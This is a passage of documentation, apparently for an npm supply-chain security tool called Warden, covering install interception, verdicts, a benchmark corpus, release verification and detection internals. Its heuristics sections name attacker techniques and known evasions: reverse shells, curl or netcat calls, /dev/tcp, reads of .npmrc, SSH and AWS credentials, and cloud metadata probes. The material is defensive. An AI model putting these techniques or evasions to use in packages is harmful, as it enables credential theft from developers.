- **install** the command adds or changes packages. Named specs are vetted; a no-argument install is treated as a graph transaction and the lockfile is audited.
- **frozen-install** the command materialises an existing lockfile. Nothing is named on the command line, so the whole graph is the transaction.
- **exec** the command downloads and runs a package. The package it would execute is vetted before it runs.
- **rebuild** the command re-runs build scripts for packages already on disk.
- **passthrough** the command changes nothing about trust and runs untouched.

## Mediated commands

### npm

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`npm install\` | protected | install |
| \`npm i\` | protected | install |
| \`npm add\` | protected | install |
| \`npm update\` | protected | install |
| \`npm up\` | protected | install |
| \`npm upgrade\` | protected | install |
| \`npm ci\` | protected | frozen-install |
| \`npm clean-install\` | protected | frozen-install |
| \`npm install-ci-test\` | protected | frozen-install |
| \`npm cit\` | protected | frozen-install |
| \`npm exec\` | protected | exec |
| \`npm x\` | protected | exec |
| \`npm rebuild\` | protected | rebuild |

### pnpm

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`pnpm install\` | protected | install |
| \`pnpm i\` | protected | install |
| \`pnpm add\` | protected | install |
| \`pnpm update\` | protected | install |
| \`pnpm up\` | protected | install |
| \`pnpm install --frozen-lockfile\` | protected | frozen-install |
| \`pnpm dlx\` | protected | exec |
| \`pnpm exec\` | protected | exec |
| \`pnpm rebuild\` | protected | rebuild |
| \`pnpm approve-builds\` | protected | rebuild |

### yarn

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`yarn install\` | protected | install |
| \`yarn i\` | protected | install |
| \`yarn add\` | protected | install |
| \`yarn up\` | protected | install |
| \`yarn upgrade\` | protected | install |
| \`yarn install --immutable\` | protected | frozen-install |
| \`yarn dlx\` | protected | exec |
| \`yarn exec\` | protected | exec |
| \`yarn rebuild\` | protected | rebuild |

### bun

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`bun install\` | protected | install |
| \`bun i\` | protected | install |
| \`bun add\` | protected | install |
| \`bun update\` | protected | install |
| \`bun install --frozen-lockfile\` | protected | frozen-install |
| \`bun x\` | protected | exec |
| \`bun create\` | protected | exec |
| \`bun pm\` | protected | rebuild |

### npx

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`npx <package>\` | protected | exec |

### bunx

| Command | Coverage | Treated as |
| --- | --- | --- |
| \`bunx <package>\` | protected | exec |

## Not mediated by the shim

- **absolute executable paths, for example /usr/local/bin/npm install** PATH shims are not on the resolution path when a manager is invoked by absolute path
- **Corepack-managed shims** Corepack resolves its own binaries; run warden integrations doctor to see whether the shim wins
- **package managers invoked inside a container or devcontainer** the container has its own PATH; install Warden inside the image to mediate it
- **arbitrary shell downloads piped to an interpreter** outside the package-manager grammar entirely; CI receipt verification is the backstop
- **Windows and PowerShell** the installer and shims target macOS and Linux shells today


## The honest part

PATH shims are a convenience mechanism, not an operating-system sandbox. An absolute path, a container, Corepack, or a remote build machine can all bypass them. That is why \`warden ci --require-transaction-receipt\` exists: it fails a pull request whose dependency graph changed without a verified receipt, and it does not depend on anything having worked locally.

Run \`warden integrations doctor\` to confirm the shims are actually first on your \`PATH\` on this machine, and read [limitations](/docs/limitations) for the rest of the boundary.
`;

const interception = `
Warden works best when you do not have to remember it. The installer places small shims ahead of \`npm\`, \`pnpm\`, \`yarn\`, \`bun\`, \`npx\`, and \`bunx\` on your \`PATH\`, so the commands you already type are the ones that get checked.

## What a shim does

1. Classifies the command against a published grammar. Anything outside it passes straight through, untouched.
2. Blocks sources with no registry provenance: git, url, and local paths.
3. Builds the full transaction plan for an install, exactly as \`warden plan\` would.
4. Delegates to the real package manager with lifecycle scripts suppressed by that manager's own mechanism.

## An install is gated on the whole graph

The shim used to vet only the package names you typed, which is precisely how a malicious transitive dependency slips through. It now gates on the complete prospective graph.

\`\`\`text
$ npm install @fastify/jwt

warden: install scripts new to this graph are suppressed and will not run:
warden:   fast-jwt@5.0.6 (postinstall)
warden:     approve with: warden approve-script fast-jwt@5.0.6 --hook postinstall
\`\`\`

\`\`\`text
$ npm install some-package

warden: this change was blocked on the whole prospective graph, not only on npm
warden:   byte-utils@2.0.0: known malicious release
warden: run warden plan -- npm install some-package to see the full graph, or override with --allow-risky
\`\`\`

| Decision | What the shim does |
| --- | --- |
| \`ALLOW\` | Delegates with scripts suppressed |
| \`WARN\` | Same, after printing the findings |
| \`NEEDS_APPROVAL\` | Installs with scripts suppressed, and names every new install script with the exact approval command |
| \`BLOCK\` | Refuses and points at \`warden plan\`. \`--allow-risky\` overrides |
| unplannable | Fails closed, like any other analysis error |

\`NEEDS_APPROVAL\` behaves differently here than in \`warden apply\`, deliberately. \`apply\` refuses, because you asked to apply a specific plan and the approval is part of it. The shim intercepted a command you already ran, and the install itself is safe with scripts suppressed, so it proceeds and tells you what is waiting. Nothing from an unapproved script runs in either case.

\`exec\` and \`rebuild\` commands are not gated: they do not change the dependency graph.

## Modes

\`warden config mode <mode>\` controls how loud interception is.

| Mode | Behaviour |
| --- | --- |
| \`brief\` | One line for an allow, full detail for a warning or block. The default |
| \`verbose\` | Full evidence on every command |
| \`quiet\` | Nothing on an allow |
| \`log\` | Records verdicts to \`~/.warden/log.jsonl\` and never blocks. Use this to observe before enforcing |

Turn interception off entirely with \`warden config intercept off\`, per scope with \`install\` or \`exec\`.

## Drop-in commands

If you would rather not install shims, \`wnpm\` and \`wnpx\` are drop-in replacements that vet first and then delegate, propagating the real exit code.

## The honest part

PATH shims are a convenience mechanism, not an operating-system sandbox. An absolute path, a container, Corepack, or a remote build machine all bypass them. Run \`warden integrations doctor\` to confirm the shims really are first on your \`PATH\`, \`warden coverage\` for the command matrix, and read [limitations](/docs/limitations) for the rest. The backstop that does not depend on any of this is \`warden ci --require-transaction-receipt\`.
`;

const explain = `
A verdict you cannot act on is a verdict you will eventually route around. Warden's explanation surface exists so that a block leads somewhere.

Every finding answers four questions, in this order:

1. What changed?
2. Why is that dangerous here?
3. What did Warden prevent?
4. What is the safest next action?

\`\`\`text
$ warden explain react-codeshift@0.1.0

BLOCK  react-codeshift@0.1.0
  confidence high · slopsquat

What changed
  react-codeshift@0.1.0 is the first release seen here
  published less than a day ago

Why that matters here
  the name matches a pattern language models are known to invent

Prevented
  the install script did not execute

Analysis limits
  12 of 12 files in the tarball were read as source

Safe next action
  warden compare react-codeshift jscodeshift
  warden history react-codeshift

  baseline: none; this is the first release
  heuristic score 62/100, analyzer 0.1.0
\`\`\`

## Decision, confidence, reason code

The decision leads. Confidence follows, because a block resting on curated malware intelligence is a different claim from one resting on a single heuristic.

| Situation | Confidence |
| --- | --- |
| Blocklist hit, or a known-malware category | high |
| A fresh clean analysis | high |
| A cached allow | medium |
| A block or warning with more than one piece of evidence | high |
| A warning with a single piece of evidence | medium |
| A block with no evidence attached | low |

## The score is a heuristic, and labelled as one

Warden still computes a 0 to 100 score from weighted signals, and reports it, at the bottom, as \`heuristic score\`. It is not the headline and not a probability. A summed score reads as more precise than it is. The decision, the confidence, and the reason code are what to act on.

## Artifact inventory

An AST scan reads JavaScript and TypeScript. A tarball can also hold native binaries, WebAssembly, nested archives, and scripts in shell, PowerShell, Python, Ruby, or Perl. Every verdict built from a fetched tarball reports how many files were read as source and names what was not, so an allow never implies the whole package was understood. Files are classified by magic bytes first, so a Mach-O binary named \`index.js\` is still reported as a native binary.

## Trusted baselines

A delta is only as good as what it is measured against. Baselines resolve in order of evidence:

| Source | Strength |
| --- | --- |
| A version you explicitly recorded | strong |
| A version a verified Warden transaction installed | strong |
| The version in your lockfile | moderate |
| The previous published release | weak |

That last case is genuinely weak, because an attacker who publishes twice moves it along with them, and \`warden baseline list\` grades it as such rather than hiding it. Pin what you have actually audited with \`warden baseline record esbuild@0.25.8 --note "audited in PR 412"\`.

## Comparing candidates

\`\`\`sh
warden compare jscodeshift react-codeshift
\`\`\`

Ranking penalises a block, then an unanalyzable candidate, then deprecation, then install scripts, and rewards provenance and real download volume. It is a summary of evidence. Warden does not install an alternative for you, and it does not pick one on the strength of a model's opinion.

## History and the standing script surface

\`warden history <pkg>\` lists releases newest first, annotating the current one with a changed publisher, lost provenance, newly added scripts, or deprecation.

\`warden scripts pending\` shows the install scripts already in your installed graph and which still need approval. It exits \`10\` while anything is pending and \`0\` once every script carries an approval, so it works as a check.
`;

const benchmark = `
A detection rate published without the corpus behind it is a number you are asked to take on faith. Warden's is reproducible: \`warden benchmark\` runs a curated corpus through the same resolver and decision logic the CLI uses, and the figures on the [benchmark dashboard](/benchmark) are generated from that run.

\`\`\`text
$ warden benchmark

Warden benchmark  analyzer 0.1.0

  detection       100.0%  12/12 malicious shapes stopped
  false positives 0.0%  0/8 benign shapes stopped
  mean coverage   100.0%  of changed packages analyzed

  every case matched its expected decision
\`\`\`

## What counts as caught

A malicious shape counts as caught only when the decision **stops the install**, which means \`BLOCK\` or \`NEEDS_APPROVAL\`. A warning does not count: a warning a developer scrolls past has prevented nothing.

A benign shape counts as a false positive when the decision stops it. False positives are the failure mode that gets a security tool uninstalled, so they sit next to detection rather than in a footnote.

## The corpus

Twelve attack shapes, each exercising a path that per-package checking misses:

| Case | Shape |
| --- | --- |
| \`mal-grandchild\` | a malicious package three levels below the one typed |
| \`mal-transitive-postinstall\` | a clean direct dependency whose child runs at install time |
| \`mal-preinstall\` | a preinstall script, which runs before anything is unpacked |
| \`mal-compromised-patch\` | a patch release adding a script the trusted version lacked |
| \`mal-vanished-dep\` | a dependency that no longer resolves |
| \`mal-transitive-git\` | a child pulled straight from a git repository |
| \`mal-transitive-url\` | a child resolving to an arbitrary https tarball |
| \`mal-needle-in-haystack\` | one malicious leaf among twelve clean siblings |
| \`mal-optional-dep\` | a malicious optional dependency |
| \`mal-diamond\` | a diamond whose shared package is compromised |
| \`mal-cycle\` | a dependency cycle containing a malicious node |
| \`mal-prepare-hook\` | a prepare script, which npm also runs at install time |

Eight benign shapes that must not be stopped: a lone dependency, a ten-level chain, a thirty-wide fan-out, a diamond, scoped packages, caret and tilde ranges, an unchanged project, and an upgrade of a package whose install script was already trusted.

## Regression, not marketing

\`warden benchmark\` exits \`20\` if any case no longer matches its recorded decision, so a rule that quietly weakens fails the build instead of moving an average. A test asserts the figures published on this site match what the binary produces today.

## What these numbers are not

These are curated shapes, not a sample of the registry. They measure whether the decision logic still behaves as designed on the paths it was built for. They are not field accuracy against real-world malware and should not be read as a claim about it.

The heuristic score is deliberately absent from this benchmark. It has not been calibrated against a labelled corpus, which is why it is labelled a heuristic everywhere it appears.
`;

const releases = `
Warden is a security tool, so how it reaches your machine is part of its threat model.

## One install script

\`\`\`sh
curl -fsSL https://warden.pulkit.page/install.sh | sh
\`\`\`

Read the script before running it. That advice applies to every install script, including this one, which is why it is served as plain text at [/install.sh](/install.sh) and is the same file published as a release asset.

The installer places \`warden\`, \`wnpm\`, and \`wnpx\` under \`~/.warden/bin\`, offers shims for the package managers it detects, and configures your shell.

## The release trust chain

Everything the installer executes comes from one immutable release tag, and everything is verified before it is used.

1. Request \`releases/latest/download/<asset>\` and read the tag from the URL actually redirected to. If no tag resolves, stop rather than guess.
2. Fetch \`sha256sums.txt\` from that exact tag.
3. Verify the platform tarball against it before extracting.
4. Fetch \`install.sh\` and \`shim.sh\` from the same tag and verify them against the same sums file before either is written to disk.

Nothing is fetched from a mutable branch. Earlier versions pulled \`install.sh\` and \`shim.sh\` from \`main\`, unverified, which meant a push between a release and an install changed executable content on a user's machine. Two tests enforce the rule now: one greps the installer for any reference to a mutable ref, and the shell harness fails the install outright if the installer ever asks for one.

Three failure modes are covered by tests:

- a tampered \`install.sh\` whose digest does not match fails the install and says so
- a release that does not list the support files is refused rather than falling back
- a missing or mismatched tarball checksum fails, as it always did

## Verify what you installed

\`\`\`sh
warden --version
warden integrations doctor
\`\`\`

The first prints the analyzer version, which is the same value stamped into every verdict as \`analyzer_version\`. The second checks that the shims are actually in front of your package managers on this machine.

## Removing it

\`\`\`sh
warden uninstall
\`\`\`

Removes the binaries, the shims, the config, the cache, and the lines Warden added to your shell rc. Lines it did not add are left alone.
`;

const engineInternals = `
\`warden check left-pad@1.3.0\` runs one function end to end: \`checkPackage\` in \`src/engine.ts\`. Everything else is a helper it calls in a fixed order. The order matters, because each step can return a verdict and stop, and because two of the early steps run before any network call. This section walks the path exactly as the code executes it, then covers the four ways it can end badly.

## Order of operations

\`runWardenCheck\` in \`src/cli/commands/check.ts\` parses the argv, sees that the positional is not one of the surface names (\`lockfile\`, \`scripts\`, \`config\`), and hands each spec to \`deps.check\`, which is wired to \`checkPackage\` in \`src/cli/deps.ts\`.

| Step | Function | Can it return a verdict? |
|---|---|---|
| 1. Split spec | \`parseSpec\` | no |
| 2. Hallucinated-name list | \`defaultHallucinated.has\` | yes, \`block\` |
| 3. Registry resolution | \`resolvePackage\` | yes, \`block\` if the name does not exist |
| 4. Missing-version guard | \`blocklist.match\`, then \`throw\` | yes, \`block\`, or an error |
| 5. Blocklist | \`blocklist.match\` | yes, \`block\` |
| 6. Cache lookup | \`VerdictCache.get\` | yes, any level |
| 7. Tarball fetch | \`fetchTarball\` | no |
| 8. Integrity check | \`verifyIntegrity\` | no, throws on mismatch |
| 9. Tar read | \`readTgz\` | no |
| 10. Previous-version diff | \`fetchTarball\` + \`readTgz\` + \`diffVersions\` | no |
| 11. Analysis | \`analyze\` | no |
| 12. Scoring | \`score\` | yes, always |
| 13. Explanation | \`explain\` | rewrites the summary only |
| 14. Quarantine and inventory | \`quarantine\`, \`buildInventory\` | no |
| 15. Cache write | \`VerdictCache.set\` | no |

\`parseSpec\` splits on the last \`@\` only when its index is greater than zero, so \`@scope/pkg\` stays a bare name and \`@scope/pkg@1.0.0\` splits correctly.

## Before the network

\`defaultHallucinated\` is a \`Set\` built from \`src/intel/data/hallucinated.json\`. A hit returns immediately: \`verdict: "block"\`, \`risk_score: 90\`, category \`slopsquat\`, \`source: "blocklist"\`, empty \`integrity\`. No HTTP request is made. This is the cheapest check and it is deliberately first.

## Registry resolution

\`resolvePackage(name, version)\` in \`src/registry.ts\` fetches the packument from \`WNPM_REGISTRY\` (default \`https://registry.npmjs.org\`) with a 10 second timeout. It sorts versions by publish time from \`time\`, resolves dist-tags, picks the previous version as the one immediately before the resolved one in that ordering, and separately fetches weekly downloads from \`WNPM_DOWNLOADS\` with a 5 second timeout.

Weekly downloads are three-valued. A 404 means zero. A failure or a non-numeric body sets \`downloadsUnknown: true\`, and \`weeklyDownloads\` stays undefined rather than being coerced to zero.

## The cache is keyed by integrity

\`VerdictCache\` is a SQLite table with \`integrity\` as the primary key, at \`WNPM_CACHE\` or \`~/.wnpm-cache/verdicts.sqlite\`. \`get\` returns null when the stored \`analyzer_version\` does not match \`ANALYZER_VERSION\` (\`"0.1.0"\`). A hit is returned with \`source\` rewritten to \`"cache"\`.

Two consequences worth knowing. A cache hit returns before the tarball is fetched, so nothing is downloaded and no integrity verification happens on that run. And entries never expire by age: \`created_at\` is written but never read. The blocklist runs before the cache, so a newly added blocklist entry still blocks a package with a stale cached \`allow\`.

## Tarball, integrity, tar

\`fetchTarball\` has a 20 second timeout. If \`meta.integrity\` is a non-empty string and \`verifyIntegrity\` fails, \`checkPackage\` throws \`integrity mismatch for <name>@<version>\` and nothing is scored. If the registry supplied no \`dist.integrity\`, the bytes are read unverified.

\`readTgz\` in \`src/tar.ts\` refuses bombs twice: the gzip ISIZE trailer is checked against \`MAX_UNPACKED_BYTES\` (512 MiB) before inflating, and the inflated length is checked again after. \`readTar\` keeps only regular files (typeflag \`0\`, NUL, or empty), supports GNU long names (typeflag \`L\`), and strips leading \`./\` and \`package/\`. Nothing is written to disk.

## Diffing against the previous version

The previous tarball is fetched inside a \`try\`/\`catch\`; any failure sets \`previous\` to undefined, which makes \`diffVersions\` report \`isNewPackage: true\`. \`diffVersions\` hashes every previous entry with sha512 via \`computeIntegrity\` and scans only files that are new or whose hash changed. Scanned files must match \`/\\.(js|cjs|mjs|jsx|ts|cts|mts|tsx|json|sh|bash)$/i\`, and text is attached only when the file is at most 512 KiB (\`MAX_SCAN_BYTES\`).

Script diffing merges registry metadata scripts with the tarball's \`package.json\` scripts, tarball winning. When the package looks new, the previous script set is empty, so every lifecycle script counts as added.

## Scoring

\`analyze\` runs six rules in order: \`ruleInstallScripts\`, \`ruleScriptContent\`, \`ruleObfuscation\`, \`ruleNameSimilarity\`, \`ruleMetadata\`, \`ruleManifest\`. \`score\` first drops signals marked \`requiresAction\` when no signal carries \`action: true\`, then walks \`decide\` as a first-match ladder: blocklist source, name attacks, \`code-reverse_shell\`, a hard-intent signal corroborated by a second action signal, a lifecycle script plus a sink, \`exfil-shape\`, obfuscation plus an exec sink, any action signal warns, total weight at or above 25 warns, otherwise allow. \`risk_score\` is the summed weights, rounded and capped at 100.

\`established\` is computed in the engine as weekly downloads at or above 100,000, or presence in the curated popular list, or \`downloadsUnknown\`. Established packages skip the name-similarity rules entirely and suppress the obfuscation-plus-exec-sink block. A downloads API outage therefore silently weakens typosquat detection.

## Explanation, quarantine, inventory

\`explain\` calls OpenAI only when \`OPENAI_API_KEY\` is set and the verdict is not \`allow\`, with a 15 second timeout and a strict JSON schema. Any failure falls back to a local template. The LLM only rewrites \`summary\`; verdict, score, categories, and evidence are untouched, and \`source\` stays \`"heuristics"\`.

\`quarantine\` copies four registry-authored strings into \`verdict.untrusted\`: description, deprecation message, maintainers, install scripts. \`sanitizeUntrusted\` strips ANSI escapes, zero-width, bidi, and control characters, collapses whitespace, and truncates to 400 characters. \`buildInventory\` reports how much of the tarball static analysis could actually read, with plain notes for native binaries, wasm, nested archives, and non-JavaScript scripts.

## Failure modes

| Situation | Result |
|---|---|
| Name is not on the registry | \`block\`, category \`slopsquat\`, \`source: "heuristics"\`, \`risk_score\` 90, empty integrity |
| Requested version missing | blocklist consulted first; otherwise throws \`version X of Y was not found on the registry\` |
| Integrity mismatch | throws \`integrity mismatch for X@Y\`, never scored |
| Registry unreachable | throws \`registry unreachable: GET <url>\` |

The CLI catches all three throws and returns exit 30 with code \`WARDEN_ANALYSIS_ERROR\`. Verdict levels map to 0, 10, and 20; \`--allow-risky\` downgrades a block to a warn's exit code.

One sharp edge: \`getJson\` returns null for any non-2xx response and for a 2xx body that is not JSON. A registry serving an HTML maintenance page is therefore indistinguishable from a missing package, and the check reports a slopsquat block.

## What it does not do

It does not scan Python, Ruby, Perl, native binaries, wasm, or nested archives. It does not scan files over 512 KiB or files unchanged since the previous version, so malicious code introduced in an earlier release is not re-examined. The blocklist and hallucinated-name list are curated JSON files compiled into the binary, not live feeds.
`;

const heuristicsInternals = `
Warden's verdict for a package version is produced by two pieces of code: \`src/heuristics/\` turns a tarball plus registry metadata into a flat list of \`Signal\` objects, and \`src/score.ts\` turns that list into an allow, warn, or block verdict. There is no model in the loop and no learned weights. The rules are hand-written, the thresholds are constants in the source, and the decision is a fixed ladder of \`if\` statements evaluated in one order. Everything below is checkable against \`src/heuristics/index.ts\`, \`src/heuristics/scan.ts\`, \`src/score.ts\`, and \`src/schema.ts\`.

## What actually gets scanned

\`diffVersions\` in \`src/diff.ts\` decides the input. Only tarball entries whose content hash differs from the same path in the previous published version are handed to the analyzer, so on an upgrade Warden reads what changed, not the whole package. A file is read as text only if it matches \`TEXT_RE\` (\`.js .cjs .mjs .jsx .ts .cts .mts .tsx .json .sh .bash\`) and is at most \`MAX_SCAN_BYTES\`, 512 KB. Everything else, native addons, WebAssembly, nested archives, Python or Ruby scripts, is counted by \`buildInventory\` and reported in \`verdict.inventory\` with plain notes such as "native binaries are present and were not analyzed", but it is never analyzed. Coverage is \`analyzed / total\`.

## What the AST scan looks for

\`scanJs\` parses with acorn as a module, retries as a script, and falls back to \`scanRegex\` on a parse failure. The walk flags: \`eval(...)\` calls and \`new Function(...)\`; \`require()\` or \`import\` of \`child_process\`; \`require()\` or \`import\` of \`http\`, \`https\`, \`net\`, \`dgram\`, \`tls\`, \`http2\`; \`fetch(...)\`; \`Buffer.from(x, "base64")\`; \`process.env\` member access; and string literals containing a public IPv4 address. \`findPublicIp\` deliberately skips loopback, broadcast, and RFC1918 ranges plus \`169.254.x\`, so bundling \`127.0.0.1\` or \`192.168.0.1\` is not a finding.

A second pass, \`scanContentPatterns\`, matches source text rather than AST nodes: cloud metadata endpoints (\`169.254.169.254\`, \`metadata.google.internal\`, \`100.100.100.200\`), credential and source paths (\`.npmrc\`, \`id_rsa\`, \`.ssh\`, \`.aws\`, \`.git/\`, \`readdirSync(process.cwd())\`), recursive deletion (\`rmSync\`/\`rmdirSync\` with \`recursive: true\`, or \`rimraf(\`), \`JSON.stringify(process.env)\`, DNS lookups, indirect eval, and a reverse shell, which requires both a \`net.connect\`/\`createConnection\`/\`new net.Socket\` and a \`spawn\`/\`exec\`/\`execSync\` of \`sh\`, \`bash\`, or \`cmd\`.

Lifecycle script bodies go through \`scanShell\`, a small regex list: \`curl\`, \`wget\`, a pipe into \`sh\`/\`bash\`/\`node\`, \`node -e\`, \`eval\`, \`base64 -d\`, netcat, \`/dev/tcp/\`, plus the same public-IP check.

\`obfuscationScore\` only fires when a hard signature is present: hex identifiers (\`_0x1a2b\`), 20 or more consecutive \`\\xNN\` escapes, or a base64 blob of 800+ characters that is also decoded and executed. Minification alone (a long line, high entropy) adds score but never sets \`hard\`, which is why plain bundles are not flagged. The two line-length contributions are mutually exclusive rather than additive: a file with a line over 2000 characters scores 0.2 and cannot also collect the 0.1 for a long average. One false negative is worth knowing about: the base64 signature is suppressed by any \`data:...;base64,\` marker anywhere in the file, not just within the matched run, so an unrelated inline data URI hides an otherwise-qualifying blob elsewhere in the same file.

## The shape of a signal

| Field | Meaning |
| --- | --- |
| \`id\` | Stable rule identifier, for example \`code-raw_ip\`. The decision ladder matches on ids, not categories. |
| \`category\` | One of the eight \`Category\` values in \`schema.ts\`, surfaced as \`verdict.categories\`. |
| \`weight\` | Integer contribution to the risk score. |
| \`confidence\` | \`low\`/\`medium\`/\`high\`. Set by every rule, but never read by \`score.ts\` and never emitted in the verdict. |
| \`evidence\` | \`{ file, line?, detail }\`; defaults to file \`package.json\`. This is the only part that reaches \`verdict.evidence\`. |
| \`action\` | Marks a signal as review-worthy on its own. Any action signal forces at least \`warn\`. |
| \`requiresAction\` | Signal is discarded unless some other signal has \`action\`. Only \`recent-publish\` (15) and \`low-install-history\` (10) use it. |

Representative weights: \`nonexistent-package\` 90, \`code-reverse_shell\` 60, \`homoglyph-typosquat\` 60, \`scoped-impersonation\` 55, \`typosquat\` 50, \`provenance-downgrade\` 40, \`install-script-added\` 35, \`exfil-shape\` 35, \`obfuscated\` 20 to 35, \`maintainer-changed\` 30, \`code-raw_ip\` and \`code-metadata_host\` 30, \`direct-url-dependency\` 30, \`install-script-changed\` and \`code-destructive_fs\` 25, \`script-*\` 25, \`code-eval\`/\`code-dns_egress\`/\`code-fs_sensitive\` 20, \`code-base64\` 15, \`code-child_process\` 10 (not an action signal), \`deprecated\` 10.

## The decision ladder, in order

\`score()\` first calls \`applicable()\` to drop \`requiresAction\` signals when nothing has \`action\`, then \`decide()\` walks these rungs and returns at the first match:

1. \`ctx.source === "blocklist"\` → block.
2. Any id in \`NAME_ATTACK_IDS\` (\`typosquat\`, \`homoglyph-typosquat\`, \`nonexistent-package\`, \`scoped-impersonation\`) → block.
3. \`code-reverse_shell\` → block.
4. A \`HARD_INTENT_IDS\` signal (\`provenance-downgrade\`, \`maintainer-changed\`) plus any other action signal → block. One alone does not block.
5. \`install-script-added\` or \`install-script-changed\` together with any \`LIFECYCLE_SINK_IDS\` member (\`code-raw_ip\`, \`code-metadata_host\`, \`code-fs_sensitive\`, \`code-destructive_fs\`, \`code-dns_egress\`, \`code-eval\`, \`code-base64\`, \`script-raw_ip\`, \`script-network\`, \`script-shell_exec\`, \`script-eval\`) → block.
6. \`exfil-shape\` → block.
7. Only if \`ctx.established\` is false: \`obfuscated\` plus any \`EXEC_SINK_IDS\` member (\`code-eval\`, \`code-child_process\`, \`script-shell_exec\`, \`script-eval\`, \`script-network\`) → block.
8. Any action signal remaining → warn.
9. Summed weight of the applicable signals \`>= 25\` → warn.
10. Otherwise allow.

Rung 7 is the only block that reputation suppresses, and it exists because bundled or obfuscation-shaped output in large packages was the dominant false positive. Rungs 1 to 6 fire regardless of how popular the package is: a newly added install script that reads \`.npmrc\` blocks a package with millions of weekly downloads.

Reputation also acts earlier, inside \`ruleNameSimilarity\`. If \`meta.established\` is true (or weekly downloads reach 100,000 when the flag is absent), no typosquat, homoglyph, delimiter, or scoped-impersonation signal is emitted at all, so rung 2 has nothing to fire on. \`nonexistent-package\` is checked before that early return and is never suppressed. In \`src/engine.ts\`, \`established\` is true when weekly downloads are at least 100,000, or the name is in the 108-entry \`POPULAR\` table, or download counts could not be fetched.

## What the risk score is, and is not

\`risk_score\` is \`Math.min(100, Math.round(sum of the applicable signal weights))\`. It is a display and triage number. It does not decide blocks: rungs 1 to 7 ignore it entirely, and it only matters at rung 9, where a total of 25 or more turns an otherwise action-free package into a warn. It is not a probability, not calibrated against any labelled dataset, and not comparable across packages in any meaningful statistical sense. Two unrelated medium signals sum to the same 40 as one strong one. The \`explain\` report deliberately names the field \`heuristic_score\` rather than reusing \`risk_score\`.

## Limitations worth knowing

Static analysis only, and only over text files under 512 KB with known source extensions; compiled, WebAssembly, archived, or non-JavaScript payloads are counted and disclosed, never inspected. Name-similarity detection compares against a hard-coded list of 108 popular packages using Damerau-Levenshtein distance with a maximum of 2, so a squat targeting a package outside that list is invisible. \`scanShell\` and \`scanContentPatterns\` are regexes and can be evaded by string construction. Metadata signals depend on registry data being available. The LLM step in \`src/engine.ts\` only rewrites the human-readable \`summary\`; it cannot change the verdict, score, categories, or evidence. Exit codes follow \`EXIT\` in \`schema.ts\`: allow 0, warn 10, block 20, error 30.
`;

const namesInternals = `
Warden treats "the name is wrong" as its own detection surface, separate from code scanning. Three independent mechanisms live under \`src/distance/\` and \`src/intel/\`: an edit-distance comparison against a hardcoded popularity table, a curated list of package names that LLMs are known to invent, and a set of brand-pattern regexes plus distance checks for registry hosts that impersonate npm or Yarn. All three feed verdicts that block rather than warn, so it is worth knowing exactly what they compare and what they do not.

## Order of checks

\`checkPackage\` in \`src/engine.ts\` runs the hallucinated-name check first, before any network call. If \`defaultHallucinated.has(name)\` is true, it returns a \`block\` verdict with \`risk_score: 90\`, \`categories: ["slopsquat"]\`, and \`source: "blocklist"\`, without resolving the package. Only then does it resolve the registry entry and consult the malware \`Blocklist\`.

Inside \`ruleNameSimilarity\` (\`src/heuristics/index.ts\`) the order is fixed:

| Step | Condition | Signal | Weight |
|---|---|---|---|
| 1 | \`meta.existsOnRegistry === false\` | \`nonexistent-package\` (slopsquat) | 90 |
| 2 | package is "established" | none, rule returns early | n/a |
| 3 | \`@scope/<bare>\` where \`popularityOf(bare) >= 10_000_000\` | \`scoped-impersonation\` | 55 |
| 4 | normalized collision and homoglyph | \`homoglyph-typosquat\` | 60 |
| 5 | normalized collision only | \`delimiter-variant\` | 30 |
| 6 | \`distance <= 2\` and target \`>= 1_000_000\` weekly | \`typosquat\` | 50 |

Steps 1 and 3 return immediately, so a nonexistent name never also produces a typosquat signal. In \`src/score.ts\`, \`NAME_ATTACK_IDS\` contains \`typosquat\`, \`homoglyph-typosquat\`, \`nonexistent-package\`, and \`scoped-impersonation\`, and any of them forces \`block\` before every other scoring rule. \`delimiter-variant\` is deliberately not in that set, so it lands at \`warn\`.

## The distance function

\`damerau(a, b)\` is a full dynamic-programming matrix with an adjacent-transposition branch (\`d[i-2][j-2] + 1\`). It has no last-occurrence table, so it is the optimal string alignment variant, not unrestricted Damerau-Levenshtein: a substring is never edited twice. The test file pins \`damerau("lodash", "lodahs") === 1\`, \`damerau("kitten", "sitting") === 3\`, and \`damerau("", "abc") === 3\`.

Lookup is a linear scan over the whole popularity array in \`nearestByDistance\`, not an index. The test named "linear scan finds distance-2 matches a BK-tree over OSA missed" asserts \`findNearestPopular("myr2sql")\` returns \`mysql\` at distance 2, which a metric-tree index over a non-metric distance can miss. Ties are resolved by array order, because the comparison is strictly \`distance < best.distance\`: \`findNearestPopular("qms")\` returns \`qs\`, listed earlier than \`ms\`, even though both are one edit away.

Guards: names whose scope-stripped form is under 3 characters return \`null\`, and a name that is itself in the table returns \`null\` (so \`lodash\` is never a squat of itself). \`maxDistance\` defaults to 2.

## Why edit distance alone was not enough

Raw edit distance both misses and over-fires. It misses homoglyph and delimiter attacks: \`cr0ss-env\` is several raw edits from \`cross-env\`, and \`class-names\` is one insertion from \`classnames\` but semantically identical. \`normalize\` handles this by stripping the scope, lowercasing, folding a fixed homoglyph table (\`0→o\`, \`1→l\`, \`3→e\`, \`4→a\`, \`5→s\`, \`7→t\`, \`@→a\`, \`$→s\`, \`|→l\`), then deleting \`-\`, \`_\`, and \`.\`. Two names that normalize to the same string are reported as \`normalizedCollision\`, and this path is checked *before* the distance scan. \`homoglyph\` is true only when the two names still differ after delimiters alone are folded, which is what separates \`l0dash\` (homoglyph, weight 60) from \`cross_env\` (delimiter variant, weight 30). Note that the \`distance\` field on a normalized collision is the raw distance and can exceed \`maxDistance\`: \`l0d-a-sh\` reports distance 3.

It over-fires on legitimate packages that happen to sit near a famous name. The fix is the reputation gate, not a tighter threshold: if \`meta.established\` is set, or weekly downloads are at least 100,000, the entire rule returns before any comparison. \`chai\` (15M downloads in the fixture registry) is two edits from \`chalk\` and is explicitly asserted to stay clean; the same gate keeps \`got\` and \`@types/react\` unflagged.

## The popularity data

